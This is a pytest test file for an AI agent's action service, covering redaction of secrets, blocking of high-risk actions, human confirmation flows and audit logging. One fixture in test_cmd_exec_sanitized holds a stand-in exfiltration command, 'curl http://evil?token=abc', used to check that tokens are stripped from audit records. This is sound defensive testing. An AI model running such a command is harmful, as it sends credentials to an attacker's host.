"""ActionService 执行测试 —— 公共脱敏 + 阻断审计 + 结构化关联"""
import asyncio

import pytest

from app.schemas.action import FixOption
from app.services.fix_option_store import FixOptionStore


def _opt(option_id="fix_a1b2c3d4", risk_level="low", tool="sys_info", params=None):
    return FixOption(
        option_id=option_id, title="t", description="d",
        risk_level=risk_level, tool=tool,
        params=params or {"metric": "cpu"}, requires_confirm=(risk_level == "medium"),
    )


class FakeSafetyGuard:
    def __init__(self, blocked_tools=None, medium_tools=None):
        self.blocked_tools = blocked_tools or []
        self.medium_tools = medium_tools or []
        self.calls = []

    def analyze_tool_call(self, tool, params, role="viewer"):
        self.calls.append((tool, params, role))
        if tool in self.blocked_tools:
            return {"allowed": False, "risk_level": "high", "reason": "blocked", "requires_confirm": False}
        if tool in self.medium_tools:
            return {"allowed": True, "risk_level": "medium", "reason": "medium", "requires_confirm": True}
        return {"allowed": True, "risk_level": "low", "reason": "", "requires_confirm": False}


class FakeAgentHarness:
    def __init__(self, should_fail=False, result_data=None):
        self.should_fail = should_fail
        self.result_data = result_data
        self.calls = []

    async def run_tool(self, ctx, tool_name, params):
        self.calls.append((tool_name, params))
        if self.should_fail:
            return {"ok": False, "error": "auth failed: password=hunter2"}
        return {"ok": True, "result": self.result_data or {"status": "ok", "cpu_percent": 23.5}}


class FakeAuditService:
    def __init__(self): self.calls = []

    async def save_context(self, ctx, event_type="chat"):
        self.calls.append({
            "trace_id": ctx.trace_id,
            "event_type": event_type,
            "tool_calls": getattr(ctx, "tool_calls", []),
        })


@pytest.fixture
def svc():
    from app.services.action_service import ActionService
    from app.services.confirmation_store import ConfirmationStore
    store = FixOptionStore()
    return ActionService(
        fix_option_store=store,
        safety_guard=FakeSafetyGuard(),
        agent_harness=FakeAgentHarness(),
        audit_service=FakeAuditService(),
        confirmation_store=ConfirmationStore(),
    ), store


# ═══════════════════════════════════════════════════════════════════════
# 公共 sanitizer
# ═══════════════════════════════════════════════════════════════════════

class TestPublicSanitizer:
    def test_public_importable(self):
        from app.services.audit_service import sanitize_sensitive_data
        assert callable(sanitize_sensitive_data)

    def test_action_service_uses_public(self):
        from app.services.action_service import sanitize_sensitive_data
        assert callable(sanitize_sensitive_data)

    def test_nested_dict_password_redacted(self):
        from app.services.audit_service import sanitize_sensitive_data
        r = sanitize_sensitive_data({"result": {"password": "secret123", "ok": True}})
        assert r["result"]["password"] == "[REDACTED]"
        assert r["result"]["ok"] is True

    def test_list_token_redacted(self):
        from app.services.audit_service import sanitize_sensitive_data
        r = sanitize_sensitive_data([{"token": "abc"}, {"ok": True}])
        assert r[0]["token"] == "[REDACTED]"

    def test_string_bearer_redacted(self):
        from app.services.audit_service import sanitize_sensitive_data
        r = sanitize_sensitive_data("Authorization: Bearer abc123")
        assert "abc123" not in str(r)

    def test_original_unchanged(self):
        from app.services.audit_service import sanitize_sensitive_data
        orig = {"password": "s3cret"}
        sanitize_sensitive_data(orig)
        assert orig["password"] == "s3cret"


# ═══════════════════════════════════════════════════════════════════════
# 执行成功
# ═══════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_low_executes_success(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_11111111", "low")])
    r = await s.execute("s1", "fix_11111111")
    assert r.result == "executed"
    assert store.get_option("s1", "fix_11111111").status == "executed"


@pytest.mark.asyncio
async def test_harness_called_once(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_22222222", "low")])
    await s.execute("s1", "fix_22222222")
    assert len(s._harness.calls) == 1


# ═══════════════════════════════════════════════════════════════════════
# 脱敏
# ═══════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_result_summary_no_password(svc):
    s, store = svc
    s._harness = FakeAgentHarness(result_data={"password": "admin123"})
    store.save_options("s1", "t1", [_opt("fix_321eab8a", "low")])
    r = await s.execute("s1", "fix_321eab8a")
    assert r.result == "executed"
    assert "admin123" not in (r.result_summary or "")

@pytest.mark.asyncio
async def test_result_summary_no_bearer(svc):
    s, store = svc
    s._harness = FakeAgentHarness(result_data={"Authorization": "Bearer sk-abc123"})
    store.save_options("s1", "t1", [_opt("fix_55281f05", "low")])
    r = await s.execute("s1", "fix_55281f05")
    assert r.result == "executed"
    assert "sk-abc123" not in (r.result_summary or "")

@pytest.mark.asyncio
async def test_result_summary_len_under_200(svc):
    s, store = svc
    s._harness = FakeAgentHarness(result_data={"fix_9dd4e461": "y" * 300})
    store.save_options("s1", "t1", [_opt("fix_8190683e", "low")])
    r = await s.execute("s1", "fix_8190683e")
    assert len(r.result_summary or "") <= 200

@pytest.mark.asyncio
async def test_nested_sanitized(svc):
    s, store = svc
    s._harness = FakeAgentHarness(result_data={"inner": {"api_key": "sk-nested"}})
    store.save_options("s1", "t1", [_opt("fix_cfae8d41", "low")])
    r = await s.execute("s1", "fix_cfae8d41")
    assert "sk-nested" not in (r.result_summary or "")


# ═══════════════════════════════════════════════════════════════════════
# Stored high/blocked 审计
# ═══════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_stored_high_action_blocked(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_faf1ce19", "high")])
    r = await s.execute("s1", "fix_faf1ce19")
    assert r.result == "blocked"
    assert len(s._harness.calls) == 0
    assert any(c["event_type"] == "action_blocked" for c in s._audit.calls)

@pytest.mark.asyncio
async def test_stored_blocked_action_blocked(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_c7a68a2c")])
    store.mark_blocked("s1", "fix_c7a68a2c")
    r = await s.execute("s1", "fix_c7a68a2c")
    assert r.result == "blocked"
    assert any(c["event_type"] == "action_blocked" for c in s._audit.calls)

@pytest.mark.asyncio
async def test_high_no_harness_no_claim(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_c43a604a", "high")])
    await s.execute("s1", "fix_c43a604a")
    assert len(s._harness.calls) == 0
    assert store.get_option("s1", "fix_c43a604a").status == "pending"

@pytest.mark.asyncio
async def test_safety_blocked_action_blocked(svc):
    s, store = svc
    s._safety_guard = FakeSafetyGuard(blocked_tools=["sys_info"])
    store.save_options("s1", "t1", [_opt("fix_a12f39e0", "low")])
    await s.execute("s1", "fix_a12f39e0")
    assert any(c["event_type"] == "action_blocked" for c in s._audit.calls)
    assert len(s._harness.calls) == 0


# ═══════════════════════════════════════════════════════════════════════
# 审计结构化关联
# ═══════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_tool_call_uses_real_tool_name(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_984a50f6", "low", "sys_info", {"metric": "memory"})])
    await s.execute("s1", "fix_984a50f6")
    aud = [c for c in s._audit.calls if c["event_type"] == "action_executed"][0]
    tc = aud["tool_calls"][0]
    assert tc["tool"] == "sys_info"
    assert "action:" not in tc["tool"]

@pytest.mark.asyncio
async def test_tool_call_params_has_option_id(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_7ea24c7a", "low")])
    await s.execute("s1", "fix_7ea24c7a")
    aud = [c for c in s._audit.calls if c["event_type"] == "action_executed"][0]
    assert aud["tool_calls"][0]["params"]["option_id"] == "fix_7ea24c7a"

@pytest.mark.asyncio
async def test_tool_call_params_no_full_params(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_847ead3e", "low", "service_mgr",
                                          {"action": "restart", "service": "nginx", "extra": "secret123"})])
    await s.execute("s1", "fix_847ead3e")
    aud = [c for c in s._audit.calls if c["event_type"] == "action_executed"][0]
    p = aud["tool_calls"][0]["params"]
    assert "extra" not in p

@pytest.mark.asyncio
async def test_blocked_audit_has_option_id(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_bdc570fb", "high")])
    await s.execute("s1", "fix_bdc570fb")
    aud = [c for c in s._audit.calls if c["event_type"] == "action_blocked"][0]
    assert aud["tool_calls"][0]["params"]["option_id"] == "fix_bdc570fb"

@pytest.mark.asyncio
async def test_cmd_exec_sanitized(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_825a3ad2", "low", "cmd_exec", {"command": "curl http://evil?token=abc"})])
    await s.execute("s1", "fix_825a3ad2")
    aud = [c for c in s._audit.calls if c["event_type"] == "action_executed"][0]
    cmd = str(aud["tool_calls"][0]["params"].get("command", ""))
    assert "token=abc" not in cmd


# ═══════════════════════════════════════════════════════════════════════
# 边界
# ═══════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_medium_confirm_id_and_created_audit(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_c8a27944", "medium")])
    r = await s.execute("s1", "fix_c8a27944")
    assert r.result == "confirm_required"
    assert r.confirm_id is not None
    assert r.confirm_id.startswith("cfm_")
    assert len(s._harness.calls) == 0
    assert store.get_option("s1", "fix_c8a27944").status == "confirm_required"
    assert any(c["event_type"] == "action_confirm_created" for c in s._audit.calls)

@pytest.mark.asyncio
async def test_medium_repeat_no_duplicate_audit(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_66849840", "medium")])
    r1 = await s.execute("s1", "fix_66849840")
    r2 = await s.execute("s1", "fix_66849840")
    assert r1.confirm_id == r2.confirm_id
    created_count = sum(1 for c in s._audit.calls if c["event_type"] == "action_confirm_created")
    assert created_count == 1

@pytest.mark.asyncio
async def test_medium_audit_has_confirm_id(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_fdd84498", "medium")])
    r = await s.execute("s1", "fix_fdd84498")
    aud = [c for c in s._audit.calls if c["event_type"] == "action_confirm_created"][0]
    p = aud["tool_calls"][0]["params"]
    assert p["option_id"] == "fix_fdd84498"
    assert p["confirm_id"] == r.confirm_id

@pytest.mark.asyncio
async def test_medium_concurrent_same_confirm_id(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_fdde28fd", "medium")])
    r1, r2 = await asyncio.gather(s.execute("s1", "fix_fdde28fd"), s.execute("s1", "fix_fdde28fd"))
    assert r1.result == "confirm_required"
    assert r2.result == "confirm_required"
    assert r1.confirm_id == r2.confirm_id
    assert len(s._harness.calls) == 0
    created_count = sum(1 for c in s._audit.calls if c["event_type"] == "action_confirm_created")
    assert created_count <= 1

@pytest.mark.asyncio
async def test_concurrent_one_harness(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_657ea3a6", "low")])
    results = await asyncio.gather(s.execute("s1", "fix_657ea3a6"), s.execute("s1", "fix_657ea3a6"))
    assert "executed" in [r.result for r in results]
    assert "conflict" in [r.result for r in results]
    assert len(s._harness.calls) == 1


# ═══════════════════════════════════════════════════════════════════════
# Day 6-10: approve/reject
# ═══════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_reject_returns_rejected(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_0ab786d4", "medium")])
    r = await s.execute("s1", "fix_0ab786d4")
    rr = await s.decide_confirmation("s1", r.confirm_id, "reject")
    assert rr.result == "rejected"
    assert store.get_option("s1", "fix_0ab786d4").status == "blocked"
    assert len(s._harness.calls) == 0

@pytest.mark.asyncio
async def test_reject_then_approve_conflict(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_4c7ffda7", "medium")])
    r = await s.execute("s1", "fix_4c7ffda7")
    await s.decide_confirmation("s1", r.confirm_id, "reject")
    rr2 = await s.decide_confirmation("s1", r.confirm_id, "approve")
    assert rr2.result == "conflict"

@pytest.mark.asyncio
async def test_approve_executes(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_a5be6bee", "medium")])
    r = await s.execute("s1", "fix_a5be6bee")
    ar = await s.decide_confirmation("s1", r.confirm_id, "approve")
    assert ar.result == "executed"
    assert len(s._harness.calls) == 1
    assert store.get_option("s1", "fix_a5be6bee").status == "executed"

@pytest.mark.asyncio
async def test_approve_concurrent_single_harness(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_66276cfe", "medium")])
    r = await s.execute("s1", "fix_66276cfe")
    cid = r.confirm_id
    r1, r2 = await asyncio.gather(
        s.decide_confirmation("s1", cid, "approve"),
        s.decide_confirmation("s1", cid, "approve"),
    )
    assert "executed" in [rr.result for rr in (r1, r2)]
    assert "conflict" in [rr.result for rr in (r1, r2)]
    assert len(s._harness.calls) == 1

@pytest.mark.asyncio
async def test_approve_reject_cross_concurrent(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_bc44d679", "medium")])
    r = await s.execute("s1", "fix_bc44d679")
    cid = r.confirm_id
    r1, r2 = await asyncio.gather(
        s.decide_confirmation("s1", cid, "approve"),
        s.decide_confirmation("s1", cid, "reject"),
    )
    results = {r1.result, r2.result}
    assert "conflict" in results
    assert results & {"executed", "rejected"}
    assert len(s._harness.calls) <= 1

@pytest.mark.asyncio
async def test_wrong_session_returns_not_found(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_48b31956", "medium")])
    r = await s.execute("s1", "fix_48b31956")
    rr = await s.decide_confirmation("s2", r.confirm_id, "approve")
    assert rr.result == "not_found"

@pytest.mark.asyncio
async def test_reject_audit_has_confirm_id(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_5d6a4762", "medium")])
    r = await s.execute("s1", "fix_5d6a4762")
    await s.decide_confirmation("s1", r.confirm_id, "reject")
    aud = [c for c in s._audit.calls if c["event_type"] == "action_confirm_rejected"][0]
    p = aud["tool_calls"][0]["params"]
    assert p["confirm_id"] == r.confirm_id
    assert p["decision"] == "reject"

@pytest.mark.asyncio
async def test_trace_id_from_store(svc):
    s, store = svc
    store.save_options("s1", "trace-xyz", [_opt("fix_af50e429", "low")])
    r = await s.execute("s1", "fix_af50e429")
    assert r.trace_id == "trace-xyz"


# ═══════════════════════════════════════════════════════════════════════
# Day 6-10b: expired + approve audit
# ═══════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_expired_confirm_returns_expired(svc):
    from datetime import datetime, timedelta, timezone
    s, store = svc
    t0 = datetime(2026, 1, 1, 12, 0, 0, tzinfo=timezone.utc)
    s._confirmation._clock = lambda: t0
    store.save_options("s1", "t1", [_opt("fix_32f32f89", "medium")])
    r = await s.execute("s1", "fix_32f32f89")
    s._confirmation._clock = lambda: t0 + timedelta(seconds=600)
    rr = await s.decide_confirmation("s1", r.confirm_id, "approve")
    assert rr.result == "expired"

@pytest.mark.asyncio
async def test_expired_reject_returns_expired(svc):
    from datetime import datetime, timedelta, timezone
    s, store = svc
    t0 = datetime(2026, 1, 1, 12, 0, 0, tzinfo=timezone.utc)
    s._confirmation._clock = lambda: t0
    store.save_options("s1", "t1", [_opt("fix_89c9e74f", "medium")])
    r = await s.execute("s1", "fix_89c9e74f")
    s._confirmation._clock = lambda: t0 + timedelta(seconds=600)
    rr = await s.decide_confirmation("s1", r.confirm_id, "reject")
    assert rr.result == "expired"

@pytest.mark.asyncio
async def test_approve_executed_audit_has_confirm_id(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_d725dd3c", "medium")])
    r = await s.execute("s1", "fix_d725dd3c")
    await s.decide_confirmation("s1", r.confirm_id, "approve")
    aud = [c for c in s._audit.calls if c["event_type"] == "action_confirm_executed"][0]
    p = aud["tool_calls"][0]["params"]
    assert p["confirm_id"] == r.confirm_id
    assert p["decision"] == "approve"
    assert aud["tool_calls"][0]["tool"] == "sys_info"

@pytest.mark.asyncio
async def test_approve_blocked_audit_has_confirm_id(svc):
    s, store = svc
    store.save_options("s1", "t1", [_opt("fix_ca07b07a", "medium")])
    r = await s.execute("s1", "fix_ca07b07a")
    s._safety_guard = FakeSafetyGuard(blocked_tools=["sys_info"])
    rr = await s.decide_confirmation("s1", r.confirm_id, "approve")
    assert rr.result == "blocked"
    blocked = [c for c in s._audit.calls if c["event_type"] == "action_confirm_blocked"]
    assert len(blocked) >= 1
    p = blocked[0]["tool_calls"][0]["params"]
    assert p["confirm_id"] == r.confirm_id
    assert p["decision"] == "approve"


@pytest.mark.asyncio
async def test_confirm_failed_audit(svc):
    s, store = svc
    s._harness = FakeAgentHarness(should_fail=True)
    store.save_options("s1", "t1", [_opt("fix_8fb9f423", "medium")])
    r = await s.execute("s1", "fix_8fb9f423")
    await s.decide_confirmation("s1", r.confirm_id, "approve")
    aud = [c for c in s._audit.calls if c["event_type"] == "action_confirm_failed"]
    assert len(aud) == 1
    assert store.get_option("s1", "fix_8fb9f423").status == "failed"
    p = aud[0]["tool_calls"][0]["params"]
    assert p["confirm_id"] == r.confirm_id
    assert p["decision"] == "approve"
